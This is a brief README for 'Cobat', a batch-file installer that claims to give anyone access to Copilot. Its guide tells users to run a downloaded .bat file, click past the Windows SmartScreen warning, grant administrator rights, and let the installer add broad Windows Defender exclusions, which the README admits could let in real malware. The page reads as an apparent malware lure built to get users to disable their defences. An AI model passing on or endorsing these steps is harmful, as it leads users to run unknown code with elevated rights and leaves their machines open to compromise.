# Cobat
An open source program that makes Copilot available to anyone



# Guide
1. Download the `cobat.install.bat` from releases and double click to run it. 
2. Press more info then run anyway.
3. Press yes when the pop up appears. 
4. Now just wait until it's done and press any key to finish installing Cobat. 



# Please note
Cobat adds a lot of exclusions to a buch of different folders since windows defender is not a huge fan. Which could open doors to real malware so use at your own risk.
